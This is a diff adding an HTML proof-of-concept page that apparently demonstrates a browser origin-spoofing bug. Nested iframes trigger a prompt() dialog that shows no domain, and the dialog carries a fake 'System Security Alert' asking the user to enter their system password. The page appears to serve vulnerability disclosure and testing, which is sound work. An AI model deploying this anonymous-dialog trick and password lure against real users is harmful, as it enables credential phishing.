@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC Origin Spoofing - Francesco</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #fafafa; }
+        .box { border: 1px solid #ccc; padding: 20px; display: inline-block; background: white; border-radius: 10px; shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        button { background-color: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        button:hover { background-color: #0056b3; }
+        code { background: #eee; padding: 2px 5px; }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <h2>Modal Origin Spoofing Test</h2>
+        <p>Click the button below to trigger a <code>prompt()</code>.</p>
+        <p><b>Observation:</b> If the dialog has no domain header (anonymous), the bug is present.</p>
+        
+        <button id="runPoc">Trigger Modal Dialog</button>
+    </div>
+
+    <div id="iframeContainer" style="display:none;"></div>
+
+    <script>
+        document.getElementById('runPoc').addEventListener('click', function() {
+            const container = document.getElementById('iframeContainer');
+            
+            // Create the first iframe
+            const frame1 = document.createElement('iframe');
+            
+            // Using srcdoc to create a nested context that calls window.prompt
+            frame1.srcdoc = `
+                <script>
+                    // Create the second (nested) blank iframe
+                    var i = document.createElement('iframe');
+                    document.body.appendChild(i);
+                    
+                    // Trigger the dialog from the blank iframe's context
+                    // This is where the origin confusion happens
+                    setTimeout(function() {
+                        window.prompt('System Security Alert:\\n\\nPlease verify your identity by entering your system password:');
+                    }, 100);
+                <\/script>
+            `;
+            
+            container.innerHTML = ''; // Clear previous test
+            container.appendChild(frame1);
+        });
+    </script>
+
+</body>
+</html>
